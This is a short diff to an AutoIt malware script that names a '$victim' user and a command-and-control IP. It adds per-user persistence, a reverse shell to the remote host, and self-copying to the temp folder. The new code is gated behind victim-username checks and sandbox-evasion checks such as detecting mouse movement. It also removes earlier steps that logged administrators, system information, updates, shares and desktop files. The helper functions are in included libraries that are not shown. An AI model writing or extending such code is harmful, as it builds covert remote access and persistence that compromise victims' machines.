@@ -4,25 +4,28 @@
 #include "libs/files.au3"
 #include "libs/misc.au3"
 
-$victim = "filippo"
+$victim = "test"
+$c2server = "192.168.0.1"
 
-if AmIusername($victim) Then
+if isRunningFromTemp() Then
 
-   if InternetCheck() Then
+   SetPersistent4CurrentUser()
 
-	  if DetectMouseMoving() Then
+   ReverseShell($RemoteIp)
 
-		 MessageBox("Debug","Hi!")
+Else
 
-		 Log2File(administrators())
+   if AmIusername($victim) Then
 
-		 Log2File(systeminfo())
+	  if InternetCheck() Then
 
-		 Log2File(updates_installed())
+		 if DetectMouseMoving() Then
 
-		 Log2File(shared())
+			MessageBox("Debug","Hi!")
 
-		 Log2File(ListDesktopFiles())
+			CopyTempRun()
+
+		 EndIf
 
 	  EndIf
 
